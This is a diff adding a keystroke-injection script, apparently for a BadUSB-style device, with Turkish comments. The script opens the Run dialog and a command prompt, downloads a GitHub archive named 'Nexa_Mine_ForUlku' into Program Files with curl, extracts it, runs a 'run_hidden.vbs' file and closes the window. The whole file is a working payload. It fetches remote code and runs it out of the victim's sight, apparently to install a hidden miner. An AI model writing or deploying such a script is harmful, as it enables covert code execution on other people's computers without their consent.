@@ -1,0 +1,30 @@
+layout('us');          
+typingSpeed(0,0);      // Maksimum hız, tuşları neredeyse anında basar
+
+waitLEDRepeat(NUM);
+
+press("GUI r");
+delay(750);             // Run penceresi açılması için kısa bekleme
+
+// CMD aç
+type("cmd\n");
+delay(600);             // CMD açılması için bekleme
+
+// GitHub repo indir
+type("curl -L -o \"C:\\Program Files\\Nexa_Mine_ForUlku.zip\" https://github.com/DimebagULKU/Nexa_Mine_ForUlku/archive/refs/heads/main.zip\n");
+delay(5500);            // 5 saniye bekleme, küçük repo için yeterli
+
+// ZIP'i aç
+type("tar -xf \"C:\\Program Files\\Nexa_Mine_ForUlku.zip\" -C \"C:\\Program Files\"\n");
+delay(1000);            // Açılması için kısa bekleme
+
+// Açılan klasöre gir
+type("cd Nexa_Mine_ForUlku-main\n");
+delay(500);
+
+// run_hidden çalıştır
+type("C:\\Program Files\\Nexa_Mine_ForUlku-main\\run_hidden.vbs\n"); 
+delay(700);             // Başlaması için kısa bekleme
+
+// CMD kapat
+type("exit\n");
